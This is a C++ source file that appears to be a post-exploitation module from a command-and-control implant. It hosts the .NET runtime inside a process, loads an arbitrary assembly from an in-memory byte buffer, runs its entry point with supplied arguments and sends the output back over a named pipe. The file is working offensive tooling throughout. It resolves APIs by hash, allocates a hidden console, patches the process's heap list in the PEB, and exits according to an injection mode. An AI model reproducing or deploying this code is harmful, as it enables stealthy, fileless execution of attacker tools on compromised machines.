#include <general.h>

using namespace mscorlib;

inline void* operator new(size_t, void* p) { return p; }
inline void operator delete(void*, void*) noexcept {}  

auto declfn dotnet_exec(
    _In_ DOTNET_ARGS* dotnet_args
) -> HRESULT {
    g_instance

    PBYTE  asm_bytes  = dotnet_args->dotnetbuff;
    ULONG  asm_length = dotnet_args->dotnetlen;
    WCHAR* arguments  = dotnet_args->arguments;
    WCHAR* appdomain  = dotnet_args->appdomain;
    WCHAR* version    = dotnet_args->fmversion;

    self->ntdll.DbgPrint("dotnet init\n");

    struct {
        GUID CLRMetaHost;
        GUID CorRuntimeHost;
    } xCLSID = {
        .CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
        .CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
    };

    struct {
        GUID IHostControl;
        GUID AppDomain;
        GUID ICLRMetaHost;
        GUID ICLRRuntimeInfo;
        GUID ICorRuntimeHost;
        GUID IDispatch;
    } xIID = {
        .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
        .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
        .ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
        .ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
        .ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
        .IDispatch        = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } }
    };

    BOOL    already_console = TRUE;
    HANDLE  backup_pipe     = nullptr;

    WCHAR** asm_argv  = { nullptr };
    ULONG   asm_argc  = { 0 };
    
    HWND    win_handle  = nullptr;

    SAFEARRAYBOUND safebound = { 0 };
    SAFEARRAY*     safeasm   = { nullptr };
    SAFEARRAY*     safeexpt  = { nullptr };
    SAFEARRAY*     safeargs  = { nullptr };

    ULONG fmversion_len = MAX_PATH;
    WCHAR fmversion[MAX_PATH] = { 0 };

    BOOL    is_loadable  = FALSE;
    HRESULT result       = 0;
    VARIANT variant_argv = { 0 };

    IAssembly*   assembly_obj    = { nullptr };
    IAppDomain*  appdomain_obj   = { nullptr };
    IMethodInfo* method_info     = { nullptr };
    IUnknown*    appdomain_thunk = { nullptr };
    IUnknown*    enum_runtime    = { nullptr };

    IEnumUnknown*    enum_unknown = { nullptr };
    ICLRMetaHost*    meta_host    = { nullptr };
    ICLRRuntimeInfo* runtime_info = { nullptr };
    ICorRuntimeHost* runtime_host = { nullptr };

    LONG array_index = 0;

    SECURITY_ATTRIBUTES secattr = { 0 };

    auto dotnet_cleanup = [&]() -> HRESULT {
        if ( backup_pipe ) {
            self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, backup_pipe );
        }

        if ( self->kernel32.GetConsoleWindow() && ! already_console ) { 
            self->kernel32.FreeConsole();
        }

        if ( asm_argv ) {
            mm::free( asm_argv ); asm_argv = nullptr;
        }

        if ( safeasm ) {
            self->oleaut32.SafeArrayDestroy( safeasm ); safeasm = nullptr;
        }

        if ( safeargs ) {
            self->oleaut32.SafeArrayDestroy( safeargs ); safeargs = nullptr;
        }

        if ( method_info ) {
            method_info->Release(); method_info = nullptr;
        }

        if ( assembly_obj ) {
            assembly_obj->Release(); assembly_obj = nullptr;
        }

        if ( appdomain_obj ) {
            appdomain_obj->Release(); appdomain_obj = nullptr;
        }

        if ( runtime_host ) {
            runtime_host->UnloadDomain( appdomain_thunk );
            runtime_host->Release(); runtime_host = nullptr;
        }

        if ( appdomain_thunk ) {
            appdomain_thunk->Release(); appdomain_thunk = nullptr;
        }

        if ( runtime_info ) {
            runtime_info->Release(); runtime_info = nullptr;
        }

        if ( enum_unknown ) {
            enum_unknown->Release(); enum_unknown = nullptr;
        }

        if ( meta_host ) {
            meta_host->Release(); meta_host = nullptr;
        }

        if ( self->pipe.output && self->pipe.output != INVALID_HANDLE_VALUE ) {
            self->kernel32.DisconnectNamedPipe( self->pipe.output );
            self->ntdll.NtClose( self->pipe.output );
            self->pipe.output = INVALID_HANDLE_VALUE;
        }

        return result;
    };

    {        
        secattr = { 
            .nLength = sizeof(SECURITY_ATTRIBUTES), 
            .lpSecurityDescriptor = nullptr,
            .bInheritHandle = TRUE
        };

        self->pipe.output = self->kernel32.CreateNamedPipeA(
            self->postex.pipename, PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, &secattr
        );

        if ( self->pipe.output == INVALID_HANDLE_VALUE ) {
            return dotnet_cleanup();
        }

        if ( ! self->kernel32.ConnectNamedPipe( self->pipe.output, nullptr ) ) {
            return dotnet_cleanup();
        }

        backup_pipe = self->kernel32.GetStdHandle( STD_OUTPUT_HANDLE );
        self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, self->pipe.output );
    }

    result = self->mscoree.CLRCreateInstance( 
        xCLSID.CLRMetaHost, xIID.ICLRMetaHost, (PVOID*)&meta_host
    );
    if ( FAILED( result ) || ! meta_host ) {
        return dotnet_cleanup();
    }

    if ( self->msvcrt.wcscmp( version, L"v0.0.00000" ) == 0 ) {
        result = meta_host->EnumerateInstalledRuntimes( &enum_unknown );
        if ( FAILED( result ) ) return dotnet_cleanup();

        while ( enum_unknown->Next( 1, &enum_runtime, 0 ) == S_OK ) {
            if ( ! enum_runtime ) continue;
    
            if ( SUCCEEDED( enum_runtime->QueryInterface( xIID.ICLRRuntimeInfo, (PVOID*)&runtime_info ) ) && runtime_info ) {
                if ( SUCCEEDED( runtime_info->GetVersionString( fmversion, &fmversion_len ) ) ) {
                    version = fmversion;
                }
            }

            enum_runtime->Release();
            enum_runtime = nullptr;
        }
    }

    result = meta_host->GetRuntime( version, xIID.ICLRRuntimeInfo, (PVOID*)&runtime_info );
    if ( FAILED( result ) ) {
        return dotnet_cleanup();
    }

    result = runtime_info->IsLoadable( &is_loadable );
    if ( FAILED( result ) || !is_loadable ) {
        return dotnet_cleanup();
    }

    result = runtime_info->GetInterface( 
        xCLSID.CorRuntimeHost, xIID.ICorRuntimeHost, (PVOID*)&runtime_host 
    );
    if ( FAILED( result ) ) {
        return dotnet_cleanup();
    }

    result = runtime_host->Start();
    if ( FAILED( result ) ) {
        return dotnet_cleanup();
    }

    result = runtime_host->CreateDomain( appdomain, nullptr, &appdomain_thunk );
    if ( FAILED( result ) ) {
        return dotnet_cleanup();
    }

    result = appdomain_thunk->QueryInterface( xIID.AppDomain, (PVOID*)&appdomain_obj );
    if ( FAILED( result ) ) {
        return dotnet_cleanup();
    }

    safebound = { asm_length, 0 };
    safeasm   = self->oleaut32.SafeArrayCreate( VT_UI1, 1, &safebound );

    mm::copy( safeasm->pvData, asm_bytes, asm_length );

    result = appdomain_obj->Load_3( safeasm, &assembly_obj );
    if ( FAILED( result ) ) {
        return dotnet_cleanup();
    }

    result = assembly_obj->get_EntryPoint( &method_info );
    if ( FAILED( result ) ) {
        return dotnet_cleanup();
    }

    result = method_info->GetParameters( &safeexpt );
    if ( FAILED( result ) ) return dotnet_cleanup();

    if ( safeexpt ) {
        if ( safeexpt->cDims && safeexpt->rgsabound[0].cElements ) {
            safeargs = self->oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

            if ( arguments && self->msvcrt.wcslen( arguments ) ) {
                asm_argv = self->shell32.CommandLineToArgvW( arguments, (PINT)&asm_argc );
            }

            variant_argv.parray = self->oleaut32.SafeArrayCreateVector( VT_BSTR, 0, asm_argc );
            variant_argv.vt     = ( VT_ARRAY | VT_BSTR );

            for ( array_index = 0; array_index < (LONG)asm_argc; array_index++ ) {
                BSTR bstr = self->oleaut32.SysAllocString( asm_argv[array_index] );
                self->oleaut32.SafeArrayPutElement( variant_argv.parray, &array_index, bstr );
                self->oleaut32.SysFreeString( bstr );
            }

            array_index = 0;
            self->oleaut32.SafeArrayPutElement( safeargs, &array_index, &variant_argv );
            self->oleaut32.SafeArrayDestroy( variant_argv.parray );
            variant_argv.parray = nullptr;
        }
    }

    win_handle = self->kernel32.GetConsoleWindow();

    if ( ! win_handle ) {
        ALLOC_CONSOLE_OPTIONS* alloc_console_optional = (ALLOC_CONSOLE_OPTIONS*)mm::alloc( sizeof( ALLOC_CONSOLE_OPTIONS ) );
        ALLOC_CONSOLE_RESULT*  alloc_console_result   = (ALLOC_CONSOLE_RESULT*)mm::alloc(  sizeof( ALLOC_CONSOLE_RESULT  ) );
        
        alloc_console_optional->showWindow    = SW_HIDE;
        alloc_console_optional->mode          = ALLOC_CONSOLE_MODE_NO_WINDOW;
        alloc_console_optional->useShowWindow = FALSE;

        self->kernel32.AllocConsoleWithOptions( alloc_console_optional, alloc_console_result );

        self->kernel32.SetStdHandle( STD_OUTPUT_HANDLE, self->pipe.output );
        self->kernel32.SetStdHandle( STD_ERROR_HANDLE,  self->pipe.output );

        mm::free( alloc_console_optional );
        mm::free( alloc_console_result );

        already_console = FALSE;
    }

    result = method_info->Invoke_3( VARIANT(), safeargs, nullptr );

    {
        if ( FAILED( result ) ) {
            self->kernel32.WriteFile( self->pipe.output, &result, sizeof( result ), nullptr, 0 );
        }

        self->kernel32.FlushFileBuffers( self->pipe.output );
    }

    return dotnet_cleanup();
}

declfn mself::mself( void ) {
    PVOID start   = startptr();
    ULONG size    = (UPTR)endptr() - (UPTR)start;
    PVOID argbuff = endptr();

    PARSER psr = {};

    this->ctx.start = start;
    this->ctx.size  = size;
    this->ctx.heap  = NtCurrentPeb()->ProcessHeap;

    this->ntdll.handle    = load_module( hashstr("ntdll.dll") );
    this->kernel32.handle = load_module( hashstr("kernel32.dll") );

    rsl_imp( ntdll );
    rsl_imp( kernel32 );

    this->mscoree.handle  = (UPTR)this->kernel32.LoadLibraryA("mscoree.dll");
    this->oleaut32.handle = (UPTR)this->kernel32.LoadLibraryA("oleaut32.dll");
    this->shell32.handle  = (UPTR)this->kernel32.LoadLibraryA("shell32.dll");
    this->msvcrt.handle   = (UPTR)this->kernel32.LoadLibraryA("msvcrt.dll");

    rsl_imp( msvcrt );
    rsl_imp( mscoree );
    rsl_imp( oleaut32 );
    rsl_imp( shell32 );

    parser::header( argbuff, &this->postex );
    parser::create( &psr, this->postex.args, this->postex.argc );

    HRESULT result = S_OK;

    ULONG dotnet_threadid = 0;

    WCHAR* arguments = (WCHAR*)parser::bytes( &psr );
    WCHAR* appdomain = (WCHAR*)parser::bytes( &psr );
    WCHAR* fmversion = (WCHAR*)parser::bytes( &psr );

    ULONG dotnetlen  = 0;
    PBYTE dotnetbuff = parser::bytes( &psr, &dotnetlen );

    DOTNET_ARGS dotnet_args = {};

    dotnet_args.dotnetbuff = dotnetbuff;
    dotnet_args.dotnetlen  = dotnetlen;
    dotnet_args.arguments  = arguments;
    dotnet_args.appdomain  = appdomain;
    dotnet_args.fmversion  = fmversion;

    dotnet_exec( &dotnet_args );

    parser::destroy( &psr );

    if ( this->postex.execmethod == KH_INJECT_SPAWN ) {
        this->ntdll.RtlExitUserProcess( result );
    } else {
        this->ntdll.RtlExitUserThread( result );
    }
}

extern "C" auto declfn entry( PVOID parameter ) -> VOID {
    PEB* peb = NtCurrentPeb();

    auto AllocHeap = (PVOID (*)( PVOID, ULONG, SIZE_T ))load_api( 
        load_module( hashstr<CHAR>( "ntdll.dll" ) ), 
        hashstr<CHAR>( "RtlAllocateHeap" ) 
    );

    auto RtlCreateHeap = (PVOID(*)(ULONG, PVOID, SIZE_T, SIZE_T, PVOID, PVOID))load_api(
        load_module( hashstr<CHAR>("ntdll.dll")), 
        hashstr<CHAR>("RtlCreateHeap")
    );
    
    PVOID CustomHeap = RtlCreateHeap(
        HEAP_GROWABLE | HEAP_ZERO_MEMORY,
        nullptr, 0x100000, 0, nullptr, nullptr
    );

    mself* self = (mself*)AllocHeap( CustomHeap, HEAP_ZERO_MEMORY, sizeof( mself ) ); 

    if (peb->NumberOfHeaps >= peb->MaximumNumberOfHeaps) {
        ULONG newMax = peb->MaximumNumberOfHeaps * 2;
        
        PVOID* newHeaps = (PVOID*)AllocHeap(
            peb->ProcessHeap, 
            HEAP_ZERO_MEMORY, 
            newMax * sizeof(PVOID)
        );

        mm::copy( newHeaps, peb->ProcessHeaps, peb->NumberOfHeaps * sizeof(PVOID) );
        
        peb->ProcessHeaps = newHeaps;
        peb->MaximumNumberOfHeaps = newMax;
    }

    peb->ProcessHeaps[peb->NumberOfHeaps] = self;
    peb->NumberOfHeaps++;

    new(self) mself();
}